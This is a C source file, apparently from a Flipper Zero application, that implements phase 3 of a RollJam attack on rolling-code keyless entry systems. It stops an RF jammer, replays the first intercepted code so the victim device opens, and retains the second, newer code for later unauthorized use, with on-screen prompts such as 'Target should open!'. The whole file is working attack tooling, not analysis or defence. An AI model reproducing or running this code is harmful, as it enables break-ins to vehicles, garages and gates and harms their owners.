#include "rolljam_scene.h"
#include "../helpers/rolljam_cc1101_ext.h"
#include "../helpers/rolljam_receiver.h"

// ============================================================
// Phase 3: STOP jam + REPLAY first signal
// The victim device opens. We keep the 2nd (newer) code.
// ============================================================

void rolljam_scene_attack_phase3_on_enter(void* context) {
    RollJamApp* app = context;

    widget_reset(app->widget);
    widget_add_string_element(
        app->widget, 64, 2, AlignCenter, AlignTop,
        FontPrimary, "PHASE 3 / 4");
    widget_add_string_element(
        app->widget, 64, 18, AlignCenter, AlignTop,
        FontSecondary, "Stopping jammer...");
    widget_add_string_element(
        app->widget, 64, 32, AlignCenter, AlignTop,
        FontPrimary, "REPLAYING 1st CODE");
    widget_add_string_element(
        app->widget, 64, 48, AlignCenter, AlignTop,
        FontSecondary, "Target should open!");

    view_dispatcher_switch_to_view(
        app->view_dispatcher, RollJamViewWidget);

    notification_message(app->notification, &sequence_blink_green_100);

    rolljam_jammer_stop(app);

    furi_delay_ms(1000);

    rolljam_transmit_signal(app, &app->signal_first);

    FURI_LOG_I(TAG, "Phase3: 1st code replayed. Keeping 2nd code.");

    notification_message(app->notification, &sequence_success);

    furi_delay_ms(800);

    view_dispatcher_send_custom_event(
        app->view_dispatcher, RollJamEventPhase3Done);
}

bool rolljam_scene_attack_phase3_on_event(void* context, SceneManagerEvent event) {
    RollJamApp* app = context;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == RollJamEventPhase3Done) {
            scene_manager_next_scene(
                app->scene_manager, RollJamSceneResult);
            return true;
        }
    }
    return false;
}

void rolljam_scene_attack_phase3_on_exit(void* context) {
    RollJamApp* app = context;
    widget_reset(app->widget);
}
